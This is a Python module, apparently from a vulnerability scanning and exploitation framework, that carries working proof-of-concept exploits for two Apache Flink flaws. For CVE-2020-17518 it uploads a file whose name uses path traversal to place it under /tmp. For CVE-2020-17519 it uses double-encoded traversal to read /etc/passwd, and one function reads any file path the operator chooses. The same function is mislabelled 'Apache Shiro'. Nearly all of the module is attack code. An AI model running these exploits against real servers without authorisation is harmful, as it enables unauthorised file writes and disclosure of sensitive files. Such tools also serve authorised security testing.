#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from thirdparty import requests
from thirdparty.requests.compat import urljoin
import threading
from core.verify import verify
from module import globals
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump


class ApacheFlink():
    def __init__(self, url):
        self.url = url
        if r"/#/overview/" in self.url:
            self.url = self.url[:-12]
        if r"/#/overview" in self.url:
            self.url = self.url[:-11]
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def cve_2020_17518_poc(self):
        # 2020-01-07
        self.threadLock.acquire()
        self.name = random_md5()
        self.vul_info["prt_name"] = "Apache Flink: CVE-2020-17518"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = 'Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/' + self.name
        self.vul_info["vul_name"] = "Apache Flink 任意文件写入漏洞"
        self.vul_info["vul_numb"] = "CVE-2020-17518"
        self.vul_info["vul_apps"] = "Flink"
        self.vul_info["vul_date"] = "2021-01-05"
        self.vul_info["vul_vers"] = "< 1.11.3 or < 1.12.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "任意文件写入"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Apache Flink 1.11.0中引入了一项更新，该更新在1.11.1及更高的版本和1.11.2中发布。" \
                                    "Apache Flink 控制面板的Submit New Job处存在任意文件上传："
        self.vul_info["cre_date"] = "2021-01-07"
        self.vul_info["cre_auth"] = "zhzyker"
        self.info = "null"

        self.method = "post"
        self.r = "PoCWating"
        self.headers = {
            'User-Agent': self.ua,
            'Connection': 'close',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y'
        }
        self.data = '\n------WebKitFormBoundaryoZ8meKnrrso89R6Y'
        self.data += '\nContent-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/' + self.name
        self.data += '\n\nsuccess'
        self.data += '\n------WebKitFormBoundaryoZ8meKnrrso89R6Y--'
        try:
            self.r404 = requests.get(self.url+"/jars/upload", headers=self.headers, timeout=self.timeout, verify=False)
            self.request = requests.post(self.url+"/jars/upload", data=self.data, headers=self.headers, timeout=self.timeout, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
            if self.r404.status_code == 404 and self.request.status_code == 400:
                if r"org.apache.flink.runtime.rest.handler.RestHandlerException:" in self.request.text:
                    self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoC_MaYbE"
                    self.vul_info["prt_info"] = "[maybe] [upload: /tmp/" + self.name + "]"
                    verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2020_17519_poc(self):
        # 2021-01-07
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Flink: CVE-2020-17519"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
        self.vul_info["vul_name"] = "Apache Flink 任意文件读取"
        self.vul_info["vul_numb"] = "CVE-2020-17519"
        self.vul_info["vul_apps"] = "Flink"
        self.vul_info["vul_date"] = "2021-01-05"
        self.vul_info["vul_vers"] = "1.5.1 - 1.11.2"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "任意文件读取"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Flink部分版本（1.11.0, 1.11.1, 1.11.2）中存在该漏洞，允许攻击者通过JobManager进程的REST " \
                                    "API，读取JobManager本地文件系统上的任意文件。访问仅限于JobManager进程可访问的文件。"
        self.vul_info["cre_date"] = "2021-01-07"
        self.vul_info["cre_auth"] = "zhzyker"
        self.pocname = self.vul_info["prt_name"]
        self.rawdata = None
        self.info = "null"
        self.method = "get"
        self.r = "PoCWating"
        self.poc = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
        try:
            self.request = requests.get(self.url+self.poc, headers=self.headers, timeout=self.timeout, verify=False)
            if r"root:x:0:0:root:/root:/bin/bash" in self.request.text and r"daemon:" in self.request.text:
                self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[url: " + self.url + self.poc + " ]"
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            print(e)
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2020_17519_exp(self, cmd):
        # 2021-01-07
        vul_name = "Apache Shiro: CVE-2020-17519"
        self.raw_data = None
        self.cmd = cmd.replace("/", "%252f")
        self.exp = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f.." + self.cmd
        try:
            self.request = requests.get(self.url+self.exp, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.request).decode('utf-8', 'ignore')
            verify.exploit_print(self.request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)
